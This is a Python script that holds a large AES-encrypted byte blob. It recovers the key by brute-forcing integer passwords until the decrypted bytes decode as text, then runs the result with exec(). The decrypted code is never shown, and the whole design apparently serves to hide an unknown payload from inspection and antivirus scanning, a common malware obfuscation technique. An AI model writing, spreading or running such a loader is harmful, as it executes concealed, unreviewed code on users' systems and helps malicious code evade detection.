from Crypto import Random
from Crypto.Cipher import AES
import hashlib

class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				print(f"\rPassword : {self.password}", end="")
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'\x85\xeb\x8e!\xc0\xfe\x07\xc2\xb8\x97\x95Q5\xdeK\xe1`W}\xe36\xfaW2\xfd{k\xb4\x97C\xff\x1cp=\xfb\x14\xf9\xe9\x92\xa6\x13\xf0\xe3h7\xbfFz\xfd\x8b\xac\x97\xc6\\\xab\xd3\xbd\xf0\xa7\xd5\x05\xf1\x14\xfb\x94w\xe3\x9d\x8bT2\x0f\xf2\xe8\xc8\nH\x02v\x92\x97\xac\xc8Uhx\x93\xd1\x11l\xcf\xe1o\x14\x13n\xf8c\xdc\xf4\xfa\xcf\xb1\xd7\x83\xb1\xdd/\xf6>\xe9\xa9u\n\xe4v\x05\x13\x9f\x84\xa3\x96!\x11\x1d\x83Z\x94\x06`\xdc_\xe9\xdc\xf7\\\xb8\x16\x88\xb7\x8c\xc1\xec\x9f\xd3x\xdd\x9a\xf2\x84\xb5*,0-\xf0&\xd9\xab.\xaasCRN\xad\x1c?\x9e\xe7\xf2\xe8\x95\rhL\x03O\x80y\xab^[\x94lM\xa3)i\xbf\x8a\xb2^\xbc\x94\x05\x99L\x8a/.!\x0b8\x00\xb9\xafC\xe4\'LhT}\xb1\x1d\x17\xba\xd8\xfd3\x9fz{\x9eu\xe5Y4\xee\x96$lT\x1a\xab\xb3m\x11\xab1m\xa2\x0e\xb7iF\x0b|\x128\xc4\xb3/\r\xe1o\x84\xc7\xb9\x8a\xe3m\xb9\x88\xeasA\x8a\x86\xc3\xfc\xd4\xe5o(\xd3u3\x15/]\xef\xff\xe5\xb4H\x80\xc9\xe5)#f\x18jQ\xe5\xd9\xc3\x90)\x8a\x97\xed\xb8\x065M\x8b\x9c\x9c\x9e\xae0\xc7y\xe9\x80\xec\x93s\x91Z|Br\x1e\xdd\x07\xef\x91\xf7\x8e\x05\xb2\xc0\xa2\x02\xa5o\xae\x05\\\xdf\xfeF<\x1c\x0c\x83j\x1c\\1\x7f\x1c\x83\x8e?\xc6\x03w\x170\xbc\x9a\xcd\xef\x08$\xcd2\x16\xdd\xef\xeee\n~\xa7\\i\xe9aW\x18\x16DP$C\xc9o\x02?\x11e\x84G\x0e\x12\xb6\xa8l\x9eY\x00\x86\x87J1j\xc6;j\xade\x16\x9f\xc1\xc9\'\x7ft\x0e\x1b\xe6\xaf\xc1>]n\x1d\xe2G\x00\xb4_\xac\x9c\xc8j\xd5\x08\xbd%\x07\xe6\x8e,\x9b\xc6\x11\xa8\x9co\xe9\x8c\xe0\x19y\xc7\x8b\x02K\x12.\x89\xefgO|\x1b\x88\xb5\'\xccS#\xdd\xf2l\xc6\xbfc\xa6\x85}\xa0\xc1*N\x97\xf0\xa6\xc0</ \xb8\xd2%kH|;F\x10\xb2\xb7\x81\xb1=]\xc6@\x88\x06\xfb\xcb\x9e\x02\x94\x8a\xd5\xee\x19_\xb2\x82\x1e\x8f\xcatb\x1e\xfb\x17\xfd\x94\x0e\x1c1\xb2y\x93Q\xf5\x8b[\x9bk\xc6\x821\xa2\xee(A8#)\xa2\x82\xef\x1eP\xec8\x0c\xa6V\xbb&\xa4\xde\xe2g\xbd\xde\xfd1_\x94\xfb6\xdaH\x80\x1a\x11I\x1dwS\x80W&e\x1a\rP\xf5O\xfcv\xf7\xb1\xf77\xf5\x17$\xc2+\xads\xa5\x0f\xe7\x12U\x8d,\x9c\x8f4\x88\x83\x1b\x1d\xa6\'\xd7\xfd\x1evY\xb4j\x8a]Bs/G)\xe7\x17\xd8O\x15H\xbdc\x02\x88K\x7f\x04\'\xf6`l~\xc3G[\xc0\x92\xe1$y\xf2;\xe1\x1bre}\nN\x9a\x87\xca\xe4\xa4\x89\x99D\xfe0\xe93s\xaa\x01\x05\xf1\x1b\x96\xe3\xfc^S\xc5\x1a\xf7\xcc\x8e8\xc8nZh\xcf\xa27\xe3\x1c \x1a\xe2\x1c\x8f\xd5\x88\x96\xe8\x94\xbe\xdc\xa2\xc7\x90\xab\x80@E,B\x9bG\x96\xaa\xe3\xfe\x12\xde\xfd\x82 \x1b\xf3\xbdT\xd1\xec\xe1\x91\x81b\xd7\xc2\xd7\x0e\xf1\x1d\xabq;\xa7\x8e~\xc9;\xb5\xb9h\x81\xd7\xf6\xfaR\xed\xed\x06~`\xb2\xb7\xf1\x1cW\xfe \xc7\xf9\x8c\x066L\xa7*<|q\xb6+\xb2\xde"\x81\x93\x88\xa6$ \xff\x14W\x1ciU\x99\xf0\xf4\x0bxn\x19\xfc\xec ;$\xb4\x0e \xc3\x1dnn\x1dP\x06n\xf1\xfcR\xc4\x16\x0e\xeb\x8b`\xd5Z\x00\x8f\x8e\x1c\xcd\xb5r\xd8\x0e\x15\xc4\xb50\xb6\x93\xeb@\xd2\xd6\xb7\xaf\xc9\xc9&:\xe21\x94\xb9\x1fzf\x05\x8bb\xcf\xeahfw\xfanw]\xb6\xcb\x1e\xf0\tR\xd0\xc29\xec\x1e\x93\xb7\x8f\x91\xba\x16\xdd\x9bX=S\x94i\xaa,\xb0/\xfe\xfbp\xacZ@\xe6\xdf\xc3\x81\xa2\x80\x19C\xa1x\xfejtYlX\x91\x86\xadk\x03\xf5*7\xab\xf2\xcfL?t/\x9cD\x16\x8a6f\xc2\xd0\x8e;\x8c\xd5\xb9\xc8H\xd9\xdb[H\x88X9J\xa4\xaf\xc2a\xa8\xb0\x16\xe7\x16\xfd\xd4\x86\xf9\t*-9j\x1c\xbbMw\xfd\x99\xccXE\x9a|\xfcg\xd6j\xffP7\x7f\xaf[[\xbb\xe9\x94,\xf7m\xbb\xf07\xd5\xc2U\x95\xb5\xb8\xfaQ\x97N\x99J\xc6\n\xe2\x91{\x99\xa6\xea`S\xeb\\\x84._K\xb9e\x8fm\x94\xb1h\xa1\xfe\xd4A\xfbRq\xd0z\xeb})\x95\x96\xeb\x01Y\xd2}\x9fk\xfe\x9d\x98\xc9D\x9959\xd9\xc1\xc1\xbc6\xd88\x8d)\x08%\x8c\xcf\xdf7^Z\xa7\t\x8a:\xfb1\x99\x00TL\xc3\x19\x9f\x04\x8eS\xc80\xa5X\x81\xec\xba\x1a\xfc\xd7\x14\x94B\xde1\x82\xdcn`\xf0;\xfce\x9c"o8}d\x19\xcbH#^\x99:\xbb\xed\xbf\xdb\xb2368p\x86O)o\x8ed\xfd\xe2\x98<\x17u\xa5\xbbk\x85U\xd0\xe7\xbb\x9f\x9c\x13,\xba\xc2>\xfc2\xafEA\x8bIl\x15\x85\x9e\x07_\xd2\xdf\x07^\xbb\xee\xa4\x151\x1a\xdd\x9ao\xf1,\xf7\xa7 \x8e\x9a\x8c\xcd\xf1VpB\x90\xe9\x93\xc3\xb9g{\x13\xcb\x0e\xb3&P\xbc\xa0\xdb\xb4\xcd\xac!\x10\x94\xb5{\x86p"\xbe\x15\xe7S\xfdK\xf0q\xd7\'\x8d\xda%\xd9r\x04\xf7\xdce\x18Kd`\xd3$VlG\xaa\xce\x11i\xc8r\xb8Y\x9ai\xb1\xe5\x9f)[\x82[7Sz\x16D\xb9\xe3H+*\x17g[1\x8fHy\x0f\x91\xfb\xedz\xa8\xfe\xed\x84b.\xcc\x9a\xfc\xc0\x0e.9\xebK[\xa9\xa8\xd4\x84n]^\xeb\xe5q\xf1\x88"\xf0\x0c\xb7\xef\x10\x069\x9e\x7f\xc8#i\x89\xb4\x00<\xdd\xb9c\xe8d.\xac3\x87\x01\x1d\x8b\x04\xdc\x8a\x1fa\xb8X!\x80\xd7\x90\\Lr\t\xec\x91\x82\xc8U\xb8\xac\xf1\x8f\x00\x98\xd4\x1b\x06\xad\x13\x91\xbe\x01\x8c\xf5Bd4U\x03\xdcA$4\x89\xec\xa1\xec\xedXVp\xec\x88\xfc F\xa2/\x99Z\xb3\x05\xe5\x9d\xf4\xe9\xde\xc9yi\x13:\x17\x81H\x02\xce\xde9\x8b\x99\xaaY\xea\x98p\xe1\x131H\x16(,6\xc3\xfe\xe8\xe5\xeay\x0c)\x08Z\xb6\xed\xfb\t\xf1\xf2\x0f\xb1o\t\xf1\x80\xe2}\x82\x8a\x9d\xe2R\xb6\xc2\xe1\x8c\'\xed\xd6\xb6\xac\xf8\xaf\x8b\xe7=\xa6\xd8\x02\xbc0R\x9b\xe5\x9b;o\x8f\xa7\x1d}Zn\xfc\x06\x88\xcb\xa7\xc2\x1a\x1fC\x93$\x18\xc8d\xd0vTn\x90l\xe1\xdb\x80\x9d\xa5(\xeb6\x84\xb7\x19\xae!v\xd6)\xa1@S\xba\xb5MB\xc5+\x84d\xe8W\x14MY\xb5\x90\xb3\xa4R?\xa4\\\x18\xcc\xf8Yk\xf6\xbc\xb4\x88f\xcf{\xb7\x91\xb5\xe1\xa2\x07\x82y\xf1o\xb2u\xb8j22%`\xe2\xa4S\x96c\x0e\x80\xa2\x17\xdb\xe2\xf7h\x03j\x95y)\xd1\xc0\xef\xf6\xf9\xfb\xe1JH\x12\x9ei\xb4&!\xb8\xfb9$\xf3~\xc4u2I\xfb\xd4\x8c\xf3\xd3\xd7M\xf1\xbe\xe1,\xf5\x9b\x9f\x8b\xbd\xffne\xdc\xcc\xddd\xb4\xfd#\xb2>\xa0\xa4\xb4\x83rH\x92\xd6T\xc7]8\xd7\x8e\xad\x8b\x05*{\xaa\x1d\x93\xd83f-/\'\x9b\xffk\xd2\xdat\xa0\x1d\'\xd5~yd\xa2\xea\xe4\xde08\r"\x91u\xe8\x90\xd1\x12-\xff\x90`\x17\x8f\x1b\x0e\xf3\xc7\xb2\x87\t\xa5\x93i\xad\x8e\xc7\x80N\x1f\xdd\xaf\x0b\t\xa4yX\xdbJ\x91\x06\x18\x96\x15\xa9\xde\x95BU\x1b<\xdf\xe9\xdd\xe3\xa3\x85\x86\xb5\xf5v\xea\x1b1*k\x07Sp\xf6\xfe\xecf\xbez!yo\xd5\xd0\xa8\xe5\xa3zF\x08\xa7\x06\xe8\xb3\xd3e\xa64\x8djWCT\x82bI\xcb\x03\xf2\xea\x90\xc95\x1c\x0e\x11v\x0e\xa9z\x9c\x99\xf2\x97\x9a\x18NO\xe23\xd4]\x1f\xcb&HM\xfb\xc5\x04\\\x1a\x04O\xfd\xdc\xd0+t\x170\xf2!(\xad;\xfb^\x16\xff\xdb\x86$\x19\x88N\xb6\xa2\xfas,\xda\x82\xcc\xb7<\x82\xca\xa5R\x9a3\xf7\xaf\x94\xe0$\xcc\xb7\xc0F\xf6\xe1\x96\x9e\xf1A\x1a6Nv\xdd\x96\x9f\xc7\xab\xf8#@\x7f)X\x970\xc9\xe7\xb7\x1d\xf8\x83\x95\xbe\xe94A\x12\xff\x90\xf3MlsL\x85\xb0\xd0\x1c\xf1[\x94\xb86\n\xf3\x8a\xb0\x17\xa3\xa4\xc4!w\xfbHF\xaajn\xbe}_6\xbd\x00I~d\xd9|\xd0LwY6\x17\xc4Y\x07\xb5\xc8S\x81\xa1~\xbc\xea\xf03\x1bn\xdb\xa3a"\xd7n\x87\xf29C2D\xda\xbe\x03\x07\x0b\xa8\xa3\x93\x87\xd1\xae]\xd2\xd0D+\xec\x8a\r\xcf\xca\x1b\x94\r\xbe\xf3Gz\x8c\xb3D?\xf7\xe9\xa5\x80c\xf7W&\x7fC\xd0<\xbe\x9e\x8c\xd8\xe9\xe8\xe0\x959`3\xe69\xae\x8b|\xec\xc8\x08H\xa3K^\xba\xe1t\x90\n\x1f\x97\xdas\xa6\xe9p\x11\x80F\xfd\x96\x9ez\xcd>L\xe8`\x06\xe1\xce\xf0tY\x97a]\x1aC\xcd\x00\x98Y\xf3\xd8\t\x80\xd7\xb1\xdd>\x85m\x0b\xf3\x95\xf0\xa4\xb4}\xc2\xb04\xe2\xa2\x19\x1f\xfd\x8am\xe0\xcf\xa56-}\xd6\xdf>\r\x11\x81y\xff8\xa8[q\x0eF/u\xcd\xf2\xc2\x0f-\x94\xaaa\xbfdHY=\xf9\x894\xd7M\xe7\xd5\xe8J;%\x01\x95\x9c\x7f\x02\x93\x18PU\x87\xc4\x80`\xf0\xbf\xe3\xe9\xe8^\x8f\xa8\x95\xe0\xa4g\xa0\xb5\\\xa8\x9c=F\xeam(\x8f\xfe\xef\xa5\x96\xf8\x07\xaeRYv\xf6|\xb9\xdam\xa9\x96\x05\xb8\xdb\xd1\x1c\xa0\xfd\xcd\xb5\xf5\xd6K\xd3A\xd6\t\x96/_\xf6,\xa2\x9e\x7f-\x1c\x00\x97 \x83\n\xfc c\xd3]3<V\xdbSH\xf5\x1e=2|\xdcaO[x\xe8\xbb\x01\xc3jwc\xd9\x1f\xa6\x19p\xd3;\xa7#\x8ee\xa8\xed\xef\x86I`\xb83!\x04\xfd\xaa\xe7a$H\xc4\x93\xadG\x87\xc7\xfa#\x90\x8f\xd1\xbd\x05\x97O|\t\xc0d.\xf4\xc1\xe2\x16\x11$\xef\x95LU\xb2\xef.B\xa6\xb6\x07\xa4\xafUc&\xd7]\x87WC\xce\xd4d`\x8f\x01\x84V\x00\xd1-.\xe8\xc9\x85)\x143\x84\x07\xbcNr^i\x7f\xcb\n\xe0,\xae\xe8\x96\x8dD;\xdbha\xfbd\'\xfe\xf2!<\x7f\x95\x93S\xdc\xc16\x93h7`\xef\xc4\xe9\xf66Y\xe2\xa5\x82M\x16\xb1\xbc\x08\x84\x8d\x9c\xf0\xf0{\xf9\\\x86\xe8\xb8\xa4\xf6n\x8b\xa7\x19tA0\x92\x1bH\x7f\xe8<\xdf\xe34*\xd9I>\xe1O\x87\n\x05\xbamKd\x93\x19\xfa\xa0K/\xbaPc\xcb\xd5\x88\xedB|\x8a\x89^\x19\xb0~\x0b`\xc6!N\xaa\x7f\x99\xcfp\xe0\x9b\xeb\xcf\xf7F\xd1\xe5\xd4\xd6R\'`l\x13\x85\x1eT`pd0k{}_\xbe5\xf6gu\x16N\x04\xb3\xbf\xccU\xbaf\x9fw\xb3\x9a\xe6\xf6\xf4\x02\x97-\xff,o\xed\x08>\xb0\x94\xb4\xb8\xd7\xeaK\x17.\xd3\xfe\xa6\nl\xe1k>\x99\xec\x9b\x08\x95p/\x85\x1a\x11\xc7(\xaf\xfb\x7f[\xb3\xcd\x0f\xe3\xf0\xe2\xf33\xd2x\xa6\xcc\xaf\x97\x88\x0f\xc0~0X\x14q.\xcf\xc8;p\x86.\xa6\xa4\x93\xe7e\x91\xcd\xc2W\x8e\xeb*\xb7\xb2\xcd\x9dZ\x01\x1e\xd7%\x19\xfaiMs\xf8i\x91\xe7\xcc\xaa\xd7\xba\xec\x82\x81!\xda\xdc\x8f\xcc\xa8l\xa7\x14\xf8I\xcaC\xa1\xf6/\xdb<\xb1\n\x17\t\xe6"qx\x81\xcf\xef\x9d\xaa\x02\xc2\xaa\xab7BB`\xae\xe1A\x1c\x1c\x9dE\xbbY\xa2\x83\xf3f\x7f\xbe\x14\xcf\xa2<*\x07\xe9\x00<?)\x1e\x91U\x8b\xecP\xd0\x88\x90\xce\xdd0\x84SAr\xd7\xe1\x04\x19t\xd5:\xad \xfa\xc9\xf1\xb5I\x9aDK\xae\xf2A\x93\x8a\xb8=M"X\x02\xcc\xe6\xfed\xe8\xcbY\xe1\x9b!\x80\xdcJ~h\x83\xd73dD\xd4T\xf8\xac\xecy\xc1\x03\xdd\x13\xe9\xd0\xbf\x87B\x1e\x0f\x98\x13\xce\xbd\x1b1\xd78q\x96\xdb{\x82\xc3\x13\xb7B\x04s?M\x8b\xd3@o-\xc61^\x82$\xf8\xadM\xae\xda\xa3\x19\xdb\xc9\xe1\x02\xb3\x1eF/P\x94&\x06mZG\xfd\xfc\xe4\xd1\x80\x94\xcd\x08]l\x91\x19\xa4\xaa\x88E\x9d\xbe\xcf\xdaz\x05\x18\xf3R\xbb0jW\xc6\xe2\x9d\x84\xf0Ez\x8a1\xfa\xbd\xd4\xfek\xbf\x92\xb7\xf4T-\xbcn\xe3,\x07\x0e\x17)\x899\x93#\x8c-I\xab/9\xf8#K\xb1\xf1\x9f{\xfdV\xc0\xd0\x98*\xce\t\xe8\xa1\n\xbdO\xbeqv\xc8\x0e\xd2K\xb9m\x94\xddn\x95\xcb'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)